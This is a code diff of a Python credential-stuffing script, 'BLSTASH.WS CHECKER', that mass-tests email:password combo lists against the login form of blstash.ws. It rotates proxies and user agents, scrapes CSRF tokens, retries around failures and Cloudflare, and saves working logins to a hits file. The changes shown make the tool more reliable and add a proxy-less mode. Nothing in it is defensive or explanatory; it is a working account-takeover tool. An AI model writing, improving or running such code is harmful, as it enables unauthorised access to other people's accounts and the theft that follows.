@@ -5,157 +5,297 @@ import time
 import warnings
 import threading
 import shutil
+import re
 from queue import Queue
 from colorama import init, Fore, Style
+from user_agent import generate_user_agent
 
-warnings.filterwarnings("ignore")
+warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
+
+# Code By - @LEGEND_BL
+UA_CONFIGS = [
+    {'os': 'win', 'navigator': 'chrome'},
+    {'os': 'win', 'navigator': 'firefox'},
+    {'os': 'mac', 'navigator': 'chrome'},
+    {'os': 'linux', 'navigator': 'chrome'},
+]
+
+def get_random_user_agent():
+    try:
+        config = random.choice(UA_CONFIGS)
+        return generate_user_agent(os=config['os'], navigator=config['navigator'])
+    except:
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
+
+try:
+    import socks
+    SOCKS_AVAILABLE = True
+except ImportError:
+    SOCKS_AVAILABLE = False
+
 columns = shutil.get_terminal_size(fallback=(80, 20)).columns
 os.system('cls' if os.name == 'nt' else 'clear')
 
 print(f"{Fore.CYAN}{'BLSTASH.WS CHECKER'.center(columns)}")
 print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
 
-combo_file = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip() or "combo.txt"
+combo_input = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
+combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"
+
+proxy_input = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip()
+proxy_file = proxy_input.strip('"').strip("'").strip() or "proxy.txt"
 
 def load_combos(fn):
     try:
+        fn = fn.strip().strip('"').strip("'").strip()
+        if not os.path.exists(fn):
+            print(f"{Fore.RED}[-] File not found: {fn}")
+            return []
         with open(fn, encoding="utf-8", errors="ignore") as f:
             return [ln.strip() for ln in f if ":" in ln and ln.strip()]
-    except: return []
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error: {e}")
+        return []
 
-def load_proxies():
+def load_proxies(fn):
     try:
-        with open("proxy.txt", encoding="utf-8", errors="ignore") as f:
-            return [ln.strip() for ln in f if ln.strip()]
-    except: return []
-
-combos = load_combos(combo_file)
-proxies = load_proxies()
-
-if not combos: input(f"{Fore.RED}No combos. Press Enter..."); exit()
-if not proxies: input(f"{Fore.RED}No proxies. Press Enter..."); exit()
-
-threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
-threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))
-
-print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")
-
-hit_counter = fail_counter = checked = 0
-lock = threading.Lock()
-start_time = time.time()
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
-]
+        fn = fn.strip().strip('"').strip("'").strip()
+        if not os.path.exists(fn):
+            print(f"{Fore.RED}[-] File not found: {fn}")
+            return []
+        with open(fn, encoding="utf-8", errors="ignore") as f:
+            proxies = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
+            return proxies if proxies else []
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error: {e}")
+        return []
 
 def format_proxy(p):
-    try:
-        p = p.strip()
-        if not p: return None
-        ptype = "http"
-        if "://" in p:
-            proto = p.split("://")[0].lower()
-            p = p.split("://", 1)[1]
-            if proto in ["socks5", "socks5h"]: ptype = "socks5h"
-            elif proto == "socks4": ptype = "socks4"
-        
-        if "@" in p:
-            auth, hp = p.rsplit("@", 1)
-            h, po = hp.split(":")
-            u, pw = auth.split(":", 1)
-            url = f"{ptype}://{u}:{pw}@{h}:{po}"
+    if not p:
+        return None
+    p = p.strip()
+    
+    if "://" in p:
+        protocol = p.split("://")[0].lower()
+        rest = p.split("://", 1)[1]
+        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
+            return None
+        if "@" in rest:
+            auth_part, host_part = rest.rsplit("@", 1)
+            if ":" in auth_part:
+                username, password = auth_part.split(":", 1)
+                proxy_url = f"{protocol}://{username}:{password}@{host_part}"
+            else:
+                proxy_url = f"{protocol}://{rest}"
         else:
-            parts = p.split(":")
-            if len(parts) == 4:
-                url = f"{ptype}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            elif len(parts) == 2:
-                url = f"{ptype}://{parts[0]}:{parts[1]}"
-            else: return None
-        return {"http": url, "https": url}
-    except: return None
+            proxy_url = f"{protocol}://{rest}"
+        return {"http": proxy_url, "https": proxy_url}
+    
+    elif "@" in p:
+        auth_part, host_part = p.rsplit("@", 1)
+        if ":" in auth_part:
+            username, password = auth_part.split(":", 1)
+            proxy_url = f"http://{username}:{password}@{host_part}"
+            return {"http": proxy_url, "https": proxy_url}
+    
+    parts = p.split(":")
+    if len(parts) == 4:
+        host, port, username, password = parts
+        proxy_url = f"http://{username}:{password}@{host}:{port}"
+        return {"http": proxy_url, "https": proxy_url}
+    elif len(parts) == 2:
+        host, port = parts
+        proxy_url = f"http://{host}:{port}"
+        return {"http": proxy_url, "https": proxy_url}
+    return None
 
-def get_cpm():
-    elapsed = time.time() - start_time
-    return round((checked / elapsed) * 60, 1) if elapsed > 0 else 0
+combos = load_combos(combo_file)
+proxies = load_proxies(proxy_file)
+
+if not combos:
+    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
+    exit()
+
+use_proxies = True
+if not proxies:
+    print(f"{Fore.YELLOW}[!] No proxies found in {proxy_file}")
+    mode_input = input(f"{Fore.CYAN}Check accounts WITHOUT proxy? (y/n, default: n): {Style.RESET_ALL}").strip().lower()
+    if mode_input == 'y':
+        use_proxies = False
+        print(f"{Fore.YELLOW}[*] Proxy-less mode: Will check {len(combos)} accounts\n")
+    else:
+        input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
+        exit()
+
+if use_proxies:
+    threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
+    threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))
+else:
+    threads_count = 1
+    print(f"{Fore.YELLOW}[*] Using 1 thread for proxy-less mode\n")
+
+if use_proxies:
+    print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")
+else:
+    print(f"{Fore.CYAN}Loaded {len(combos)} combos | No proxies | Threads: {threads_count}\n")
+print(f"{Fore.BLUE}[*] Starting checker...!\n")
+
+hit_counter = fail_counter = 0
+counters_lock = threading.Lock()
+print_lock = threading.Lock()
+result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
+    """Check Blstash account - FIX: Better connection handling and retry logic"""
     s = requests.Session()
-    ua = random.choice(USER_AGENTS)
+    userA = get_random_user_agent()
+    
+    # Configure session for better reliability
+    s.headers.update({
+        "User-Agent": userA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+    })
     
     try:
+        # Try to get the main page with retries
+        main_url = "https://blstash.ws/"
+        r1 = None
+        
+        for attempt in range(2):
+            try:
+                r1 = s.get(main_url, proxies=proxy_dict, timeout=30, verify=False)
+                break
+            except requests.exceptions.ConnectionError:
+                if attempt == 0:
+                    time.sleep(2)
+                    continue
+                raise
+        
+        if r1 is None or r1.status_code >= 500:
+            return "error", "Site unavailable"
+        
+        # Check for Cloudflare
+        if r1.status_code == 403 or "cloudflare" in r1.text.lower():
+            return "fail", "Cloudflare blocked"
+        
+        # Extract any CSRF token
+        csrf = ""
+        csrf_match = re.search(r'name=["\']?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']', r1.text, re.I)
+        if csrf_match:
+            csrf = csrf_match.group(1)
+        
+        # Update headers for login
         headers = {
-            "User-Agent": ua,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://blstash.ws",
+            "Referer": "https://blstash.ws/login",
         }
         
-        # Get main page
-        s.get("https://blstash.ws/", headers=headers, proxies=proxy_dict, timeout=15, verify=False)
+        # Build login data
+        login_data = {"username": email, "password": pwd}
+        if csrf:
+            login_data["csrf_token"] = csrf
         
-        # Try login - use form post to main login page
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-        headers["Origin"] = "https://blstash.ws"
-        headers["Referer"] = "https://blstash.ws/login"
-        
-        r = s.post("https://blstash.ws/login", 
-                   data={"username": email, "password": pwd},
-                   headers=headers, proxies=proxy_dict, timeout=15, verify=False, allow_redirects=True)
+        r = s.post("https://blstash.ws/login", data=login_data,
+                   headers=headers, proxies=proxy_dict, timeout=30, verify=False, allow_redirects=True)
         
         txt = r.text.lower()
         url = r.url.lower()
         
-        if any(x in url for x in ["dashboard", "panel", "home"]) or any(x in txt for x in ["balance", "logout", "welcome"]):
+        # Success indicators
+        if any(x in url for x in ["dashboard", "panel", "home", "account"]) and "login" not in url:
             return "hit", "Valid"
-        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
-            return "fail", "Invalid"
+        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
+            return "hit", "Valid"
+        
+        # Failure indicators
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "failed"]):
+            return "fail", "Invalid credentials"
+        
+        # Check if on login page still
+        if "login" in url:
+            return "fail", "Login failed"
+            
         return "fail", f"Status {r.status_code}"
+        
     except requests.exceptions.Timeout:
         return "error", "Timeout"
-    except:
-        return "error", "Error"
+    except requests.exceptions.ConnectionError:
+        return "error", "Connection error"
+    except requests.exceptions.ProxyError:
+        return "error", "Proxy error"
+    except Exception as e:
+        return "error", f"Error: {str(e)[:30]}"
 
 def worker(q):
-    global checked, hit_counter, fail_counter
+    global result_counter, hit_counter, fail_counter
     while True:
-        try: combo = q.get_nowait()
-        except: break
+        try:
+            combo = q.get_nowait()
+        except:
+            break
         
-        parts = combo.split(":", 1)
-        if len(parts) != 2: q.task_done(); continue
-        email, pwd = parts
+        email, pwd = combo.split(":", 1)
+        proxy_dict = None
         
-        result, reason = "error", "No proxy"
-        for _ in range(3):
-            proxy_dict = format_proxy(random.choice(proxies))
-            if proxy_dict:
-                result, reason = check_account(email, pwd, proxy_dict)
-                if result != "error": break
-                time.sleep(0.5)
+        if use_proxies:
+            for _ in range(3):
+                proxy_str = random.choice(proxies)
+                proxy_dict = format_proxy(proxy_str)
+                if proxy_dict: break
+            
+            if not proxy_dict:
+                with counters_lock: fail_counter += 1
+                with counters_lock: num = result_counter + 1; result_counter = num
+                with print_lock:
+                    print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy")
+                q.task_done()
+                continue
         
-        with lock:
-            checked += 1
-            if result == "hit":
-                hit_counter += 1
-                print(f"{Fore.GREEN}[HIT] {email}:{pwd} | CPM: {get_cpm()}")
-                with open("Blstash_Hits.txt", "a") as f: f.write(f"{email}:{pwd}\n")
-            else:
-                fail_counter += 1
-                print(f"{Fore.RED}[FAIL] {email}:{pwd} | {reason} | CPM: {get_cpm()}")
+        result, reason = "error", "Unknown"
+        for attempt in range(3):
+            result, reason = check_account(email, pwd, proxy_dict)
+            if result != "error":
+                break
+            time.sleep(3 + attempt * 2)
+        
+        with counters_lock: num = result_counter + 1; result_counter = num
+        
+        if result == "hit":
+            with counters_lock: hit_counter += 1
+            with open("Blstash_Hits.txt", "a", encoding="utf-8") as f:
+                f.write(f"{email}:{pwd} | Code By - @LEGEND_BL\n")
+            with print_lock:
+                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Status: Valid")
+        else:
+            with counters_lock: fail_counter += 1
+            with print_lock:
+                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason}")
         
         q.task_done()
-        time.sleep(0.1)
+        time.sleep(3)
 
 def main():
     q = Queue()
-    for c in combos: q.put(c)
+    for c in combos:
+        q.put(c)
+    
     open("Blstash_Hits.txt", "w").close()
+    
     for _ in range(threads_count):
-        threading.Thread(target=worker, args=(q,), daemon=True).start()
+        t = threading.Thread(target=worker, args=(q,), daemon=True)
+        t.start()
+    
     q.join()
-    print(f"\n{Fore.CYAN}Done! Hits: {hit_counter} | Failed: {fail_counter} | CPM: {get_cpm()}")
-    input("Press Enter...")
+    
+    print(f"\n{Fore.CYAN}Finished...!")
+    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter}")
+    print(f"{Fore.CYAN}Hits saved to Blstash_Hits.txt")
+    input(f"\nPress Enter to exit...")
 
 if __name__ == "__main__":
     main()
